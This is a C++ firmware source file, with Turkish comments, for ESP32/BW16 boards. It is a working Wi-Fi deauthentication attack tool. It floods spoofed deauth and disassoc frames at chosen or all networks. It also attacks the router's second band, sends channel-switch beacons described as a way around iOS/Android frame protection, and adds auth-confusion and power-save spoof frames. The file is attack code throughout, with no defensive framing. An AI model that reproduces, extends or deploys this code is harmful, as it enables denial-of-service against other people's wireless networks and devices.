#include <WiFi.h>
#include "platform_compat.h"
#include "types.h"
#include "board_hal.h"
#include "deauth.h"
#include "definitions.h"

// num_networks: web_interface.cpp'de tanımlı
extern int num_networks;

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
deauth_frame_t deauth_frame        = make_deauth_frame();
int            deauth_type         = DEAUTH_TYPE_SINGLE;
int            eliminated_stations = 0;
char           deauth_target_ssid[33]  = {0};
uint8_t        deauth_target_bssid[6]  = {0};
int            deauth_target_channel   = 1;

// ─── Çift bant eşlikçi değişkenleri ──────────────────────────────────────────
bool    deauth_has_companion      = false;
uint8_t deauth_target2_bssid[6]   = {0};
int     deauth_target2_channel    = 1;
char    deauth_target2_ssid[33]   = {0};

// ─── Düşük seviye bağımlılıklar (yalnızca ESP32) ─────────────────────────────
#ifndef BOARD_BW16
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
#endif

// ─── Forward declaration ──────────────────────────────────────────────────────
static void sniffer_cb(const uint8_t *frame, uint16_t len);

// ─── Yardımcı: aynı modeme ait eşlikçi bant ağını bul ────────────────────────
// Kriter: OUI eşleşmesi (BSSID ilk 3 byte) + farklı bant
static int find_companion_network(const uint8_t *primary_bssid, int primary_ch) {
  bool primary_5g = IS_5GHZ_CHANNEL(primary_ch);
  for (int i = 0; i < num_networks; i++) {
    int ch = WiFi_channel_scan(i);
    if (IS_5GHZ_CHANNEL(ch) == primary_5g) continue; // aynı bant, atla
    if (memcmp(primary_bssid, WiFi_BSSID_scan(i), 3) == 0) return i; // OUI eşleşti
  }
  return -1;
}

// ─── Yardımcı: eşlikçi BSSID'den mevcut kanalda deauth inject ────────────────
// Kanal değiştirmeden, eşlikçi AP'miş gibi sahte deauth çerçeveleri gönderir.
// Hem hedef istemci adresine hem broadcast'e gönderilir.
IRAM_ATTR static void inject_companion_deauth(const uint8_t *sta_mac) {
  if (!deauth_has_companion) return;
  static const uint8_t reasons[4] = {7, 6, 2, 3};
  deauth_frame_t f2 = make_deauth_frame();
  memcpy(f2.access_point, deauth_target2_bssid, 6);
  memcpy(f2.sender,       deauth_target2_bssid, 6);
  memcpy(f2.station,      sta_mac, 6);

  // Yön 1: eşlikçi AP → istemci
  for (int r = 0; r < 4; r++) {
    f2.frame_control[0] = 0xC0; f2.reason = reasons[r];
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f2, sizeof(f2));
    f2.frame_control[0] = 0xA0;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &f2, sizeof(f2));
  }

  // Yön 2: istemci → eşlikçi AP spoof
  deauth_frame_t f2_rev = make_deauth_frame();
  memcpy(f2_rev.access_point, deauth_target2_bssid, 6);
  memcpy(f2_rev.sender,       sta_mac, 6);
  memcpy(f2_rev.station,      deauth_target2_bssid, 6);
  f2_rev.frame_control[0] = 0xC0; f2_rev.reason = 3;
  for (int i = 0; i < 8; i++) hal_wifi_80211_tx(HAL_IF_AP, &f2_rev, sizeof(f2_rev));
  f2_rev.frame_control[0] = 0xA0; f2_rev.reason = 8;
  for (int i = 0; i < 8; i++) hal_wifi_80211_tx(HAL_IF_AP, &f2_rev, sizeof(f2_rev));

  // Broadcast eşlikçi deauth
  memset(f2.station, 0xFF, 6);
  f2.frame_control[0] = 0xC0; f2.reason = 3;
  for (int i = 0; i < 6; i++) hal_wifi_80211_tx(HAL_IF_AP, &f2, sizeof(f2));
  f2.frame_control[0] = 0xA0;
  for (int i = 0; i < 6; i++) hal_wifi_80211_tx(HAL_IF_AP, &f2, sizeof(f2));
}

// ─── CSA Beacon (iOS / Android PMF bypass) ───────────────────────────────────
// Hem birincil hem eşlikçi bant için CSA beacon gönderir.
static void _send_csa_for(const uint8_t *bssid, const char *ssid, int channel) {
  uint8_t  ssid_len = (uint8_t)strnlen(ssid, 32);
  uint8_t  ch       = (uint8_t)channel;
  bool     is5ghz   = IS_5GHZ_CHANNEL(channel);
  uint8_t  csa_ch   = is5ghz ? 0 : 14;
  uint8_t  op_class = is5ghz ? get_5ghz_op_class(ch) : 81;

  uint8_t buf[160];
  uint8_t *p = buf;

  *p++ = 0x80; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  memset(p, 0xFF, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;

  memset(p, 0x00, 8); p += 8;
  *p++ = 0x64; *p++ = 0x00;
  *p++ = 0x11; *p++ = 0x04;

  *p++ = 0x00; *p++ = ssid_len;
  memcpy(p, ssid, ssid_len); p += ssid_len;

  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  *p++ = 0x03; *p++ = 0x01; *p++ = ch;

  *p++ = 0x25; *p++ = 0x03;
  *p++ = 0x01; *p++ = csa_ch; *p++ = 0x01;

  *p++ = 0x3C; *p++ = 0x04;
  *p++ = 0x01; *p++ = op_class; *p++ = csa_ch; *p++ = 0x01;

  *p++ = 0x28; *p++ = 0x06;
  *p++ = 0x01; *p++ = 0x01;
  *p++ = 0xFF; *p++ = 0x7F;
  *p++ = 0x00; *p++ = 0x00;

  int frame_len = (int)(p - buf);
  for (int i = 0; i < 10; i++) {
    hal_wifi_80211_tx(HAL_IF_AP, buf, frame_len);
    delayMicroseconds(500);
  }
}

IRAM_ATTR void send_csa_beacon() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;

  // Birincil kanal CSA
  _send_csa_for(deauth_frame.access_point, deauth_target_ssid, deauth_target_channel);

  // Eşlikçi bant CSA: kanalda deauth_target2 kanalına hop et, CSA gönder, geri dön
  if (deauth_has_companion) {
    hal_wifi_set_promiscuous(false);
    hal_wifi_set_channel(deauth_target2_channel);
    delayMicroseconds(8000);
    _send_csa_for(deauth_target2_bssid,
                  deauth_target2_ssid[0] ? deauth_target2_ssid : deauth_target_ssid,
                  deauth_target2_channel);
    hal_wifi_set_channel(deauth_target_channel);
    delayMicroseconds(5000);
    hal_wifi_set_promiscuous(true);
    hal_wifi_set_promiscuous_filter();
    hal_wifi_set_promiscuous_rx_cb(sniffer_cb);
  }
}

// ─── Yardımcı: Auth confusion (0xB0) ─────────────────────────────────────────
IRAM_ATTR static void send_auth_confusion(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[30];
  uint8_t *p = buf;
  *p++ = 0xB0; *p++ = 0x00;
  *p++ = 0x3A; *p++ = 0x01;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  *p++ = 0x02; *p++ = 0x00;
  *p++ = 0x0D; *p++ = 0x00;
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
}

// ─── Yardımcı: NULL data power-save spoof ────────────────────────────────────
IRAM_ATTR static void send_null_powerdown(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[24];
  uint8_t *p = buf;
  *p++ = 0x48; *p++ = 0x11;
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
}

// ─── Promiscuous sniffer ──────────────────────────────────────────────────────
IRAM_ATTR static void sniffer_cb(const uint8_t *frame, uint16_t len) {
  if (len < sizeof(mac_hdr_t)) return;
  const wifi_packet_t *pkt = (const wifi_packet_t *)frame;
  const mac_hdr_t     *hdr = &pkt->hdr;

  static const uint8_t reasons[4] = {7, 6, 2, 3};

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(hdr->dest, deauth_frame.sender, 6) != 0) return;
    memcpy(deauth_frame.station, hdr->src, 6);

    // Yön 1: AP → Station (birincil bant)
    for (int r = 0; r < 4; r++) {
      deauth_frame.frame_control[0] = 0xC0;
      deauth_frame.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));

      deauth_frame.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));
    }

    // Yön 2: Station → AP spoof (birincil bant)
    {
      deauth_frame_t f_rev = make_deauth_frame();
      memcpy(f_rev.access_point, deauth_frame.access_point, 6);
      memcpy(f_rev.sender,       hdr->src,                  6);
      memcpy(f_rev.station,      deauth_frame.access_point, 6);
      f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
      for (int i = 0; i < 10; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
      f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
      for (int i = 0; i < 10; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
    }

    // Auth confusion + NULL power-save
    send_auth_confusion(deauth_frame.access_point, hdr->src);
    send_null_powerdown(deauth_frame.access_point, hdr->src);

    // Broadcast DEAUTH + DISASSOC (birincil bant)
    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = 3;
    for (int i = 0; i < 6; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));
    deauth_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < 6; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));

    // ── Çift bant: eşlikçi BSSID'den de deauth inject (mevcut kanalda) ──────
    // İstemci aynı kanalda olduğu için eşlikçi AP'den gelmiş gibi gören deauth
    // çerçeveleri de alır → roaming girişimi engellenir.
    inject_companion_deauth(hdr->src);

    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;

  } else { // DEAUTH_TYPE_ALL
    if ((memcmp(hdr->dest, hdr->bssid, 6) != 0) ||
        (memcmp(hdr->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0)) return;

    memcpy(deauth_frame.station,      hdr->src,  6);
    memcpy(deauth_frame.access_point, hdr->dest, 6);
    memcpy(deauth_frame.sender,       hdr->dest, 6);

    for (int r = 0; r < 4; r++) {
      deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));
      deauth_frame.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));
    }

    {
      deauth_frame_t f_rev = make_deauth_frame();
      memcpy(f_rev.access_point, hdr->dest, 6);
      memcpy(f_rev.sender,       hdr->src,  6);
      memcpy(f_rev.station,      hdr->dest, 6);
      f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &f_rev, sizeof(f_rev));
      f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &f_rev, sizeof(f_rev));
    }

    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = 3;
    for (int i = 0; i < 4; i++)
      hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));
    deauth_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < 4; i++)
      hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));

    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;
  }

  eliminated_stations++;
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

// ─── Periyodik eşlikçi bant deauth patlaması ──────────────────────────────────
// main loop'tan ~2 saniyede bir çağrılır.
// Eşlikçi kanalına (örn. 5GHz) geçer, broadcast deauth patlatır, geri döner.
// Birincil kanalda takılı kalmayan istemcileri de etkisiz kılar.
void send_companion_deauth_burst() {
  if (!deauth_has_companion || deauth_type != DEAUTH_TYPE_SINGLE) return;

  hal_wifi_set_promiscuous(false);
  hal_wifi_set_channel(deauth_target2_channel);
  delay(15);

  deauth_frame_t f = make_deauth_frame();
  memcpy(f.access_point, deauth_target2_bssid, 6);
  memcpy(f.sender,       deauth_target2_bssid, 6);

  // Broadcast deauth — tüm istemcilere
  static const uint8_t reasons[] = {7, 6, 2, 3};
  memset(f.station, 0xFF, 6);
  for (int r = 0; r < 4; r++) {
    f.frame_control[0] = 0xC0; f.reason = reasons[r];
    for (int i = 0; i < 12; i++) hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
    f.frame_control[0] = 0xA0;
    for (int i = 0; i < 8; i++)  hal_wifi_80211_tx(HAL_IF_AP, &f, sizeof(f));
  }

  // Eşlikçi kanalda CSA beacon da gönder
  _send_csa_for(deauth_target2_bssid,
                deauth_target2_ssid[0] ? deauth_target2_ssid : deauth_target_ssid,
                deauth_target2_channel);

  delay(10);
  hal_wifi_set_channel(deauth_target_channel);
  delay(15);
  hal_wifi_set_promiscuous(true);
  hal_wifi_set_promiscuous_filter();
  hal_wifi_set_promiscuous_rx_cb(sniffer_cb);

  DEBUG_PRINTF("Companion burst: kanal %d %s\n",
    deauth_target2_channel,
    IS_5GHZ_CHANNEL(deauth_target2_channel) ? "(5GHz)" : "(2.4GHz)");
}

// ─── Hedef yeniden bulma ───────────────────────────────────────────────────────
void retrack_deauth_target() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;
  if (strnlen(deauth_target_ssid, 33) == 0) return;

  DEBUG_PRINT("Hedef yeniden taraniyor: ");
  DEBUG_PRINTLN(deauth_target_ssid);

  hal_wifi_set_promiscuous(false);

  int n = WiFi_scanNetworks_ex();
  bool found_primary   = false;
  bool found_companion = false;

  for (int i = 0; i < n; i++) {
    const char *ssid = WiFi_SSID_cstr(i);

    // Birincil hedef: BSSID OUI + SSID eşleşmesi
    if (!found_primary &&
        strcmp(ssid, deauth_target_ssid) == 0 &&
        memcmp(WiFi_BSSID_scan(i), deauth_target_bssid, 3) == 0) {

      int    new_ch       = WiFi_channel_scan(i);
      bool   ch_changed   = (new_ch != deauth_target_channel);
      bool   mac_changed  = memcmp(WiFi_BSSID_scan(i), deauth_target_bssid, 6) != 0;

      if (ch_changed || mac_changed) {
        deauth_target_channel = new_ch;
        memcpy(deauth_target_bssid, WiFi_BSSID_scan(i), 6);
        memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
        memcpy(deauth_frame.sender,       deauth_target_bssid, 6);
        WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
        delay(100);
        apply_max_performance();
        DEBUG_PRINTF("Birincil yeni kanal: %d %s\n",
          deauth_target_channel,
          IS_5GHZ_CHANNEL(deauth_target_channel) ? "(5GHz)" : "(2.4GHz)");
      }
      found_primary = true;
    }

    // Eşlikçi hedef: OUI eşleşmesi + farklı bant
    if (!found_companion && deauth_has_companion &&
        memcmp(deauth_target_bssid, WiFi_BSSID_scan(i), 3) == 0 &&
        IS_5GHZ_CHANNEL(WiFi_channel_scan(i)) != IS_5GHZ_CHANNEL(deauth_target_channel)) {

      int new_ch2 = WiFi_channel_scan(i);
      if (new_ch2 != deauth_target2_channel ||
          memcmp(WiFi_BSSID_scan(i), deauth_target2_bssid, 6) != 0) {
        deauth_target2_channel = new_ch2;
        memcpy(deauth_target2_bssid, WiFi_BSSID_scan(i), 6);
        strncpy(deauth_target2_ssid, WiFi_SSID_cstr(i), 32);
        deauth_target2_ssid[32] = '\0';
        DEBUG_PRINTF("Eslıkci yeni kanal: %d %s\n",
          deauth_target2_channel,
          IS_5GHZ_CHANNEL(deauth_target2_channel) ? "(5GHz)" : "(2.4GHz)");
      }
      found_companion = true;
    }

    if (found_primary && (!deauth_has_companion || found_companion)) break;
  }
  WiFi_scanDelete();

  hal_wifi_set_promiscuous(true);
  hal_wifi_set_promiscuous_filter();
  hal_wifi_set_promiscuous_rx_cb(sniffer_cb);
}

// ─── Saldırı başlat/durdur ────────────────────────────────────────────────────
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type         = attack_type;
  deauth_frame        = make_deauth_frame();
  deauth_frame.reason = reason;
  deauth_has_companion = false;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    strncpy(deauth_target_ssid, WiFi_SSID_cstr(wifi_number), 32);
    deauth_target_ssid[32]  = '\0';
    deauth_target_channel   = WiFi_channel_scan(wifi_number);
    memcpy(deauth_target_bssid, WiFi_BSSID_scan(wifi_number), 6);
    memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
    memcpy(deauth_frame.sender,       deauth_target_bssid, 6);

    // ── Çift bant eşlikçi tespiti ────────────────────────────────────────────
    int comp_idx = find_companion_network(deauth_target_bssid, deauth_target_channel);
    if (comp_idx >= 0) {
      deauth_has_companion      = true;
      deauth_target2_channel    = WiFi_channel_scan(comp_idx);
      memcpy(deauth_target2_bssid, WiFi_BSSID_scan(comp_idx), 6);
      strncpy(deauth_target2_ssid, WiFi_SSID_cstr(comp_idx), 32);
      deauth_target2_ssid[32] = '\0';
      DEBUG_PRINTF("Cift bant tespit edildi! Eslıkci: kanal %d %s BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
        deauth_target2_channel,
        IS_5GHZ_CHANNEL(deauth_target2_channel) ? "(5GHz)" : "(2.4GHz)",
        deauth_target2_bssid[0], deauth_target2_bssid[1], deauth_target2_bssid[2],
        deauth_target2_bssid[3], deauth_target2_bssid[4], deauth_target2_bssid[5]);
    }

    DEBUG_PRINT("Deauth baslatiyor: ");
    DEBUG_PRINT(deauth_target_ssid);
    DEBUG_PRINTF(" Kanal %d %s%s\n",
      deauth_target_channel,
      IS_5GHZ_CHANNEL(deauth_target_channel) ? "(5GHz)" : "(2.4GHz)",
      deauth_has_companion ? " + eslıkci bant" : "");

    WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
    delay(100);
    apply_max_performance();
  } else {
    DEBUG_PRINTLN("Tum aglara deauth (2.4+5GHz)...");
    WiFi.softAPdisconnect();
#ifndef BOARD_BW16
    WiFi.mode(WIFI_MODE_STA);
#endif
    delay(100);
    apply_max_performance();
  }

  hal_wifi_set_promiscuous(true);
  hal_wifi_set_promiscuous_filter();
  hal_wifi_set_promiscuous_rx_cb(sniffer_cb);
}

void stop_deauth() {
  hal_wifi_set_promiscuous(false);
  deauth_type           = DEAUTH_TYPE_SINGLE;
  deauth_target_ssid[0] = '\0';
  eliminated_stations   = 0;
  deauth_has_companion  = false;
  memset(deauth_target2_bssid, 0, 6);
  deauth_target2_channel = 1;
  deauth_target2_ssid[0] = '\0';
}
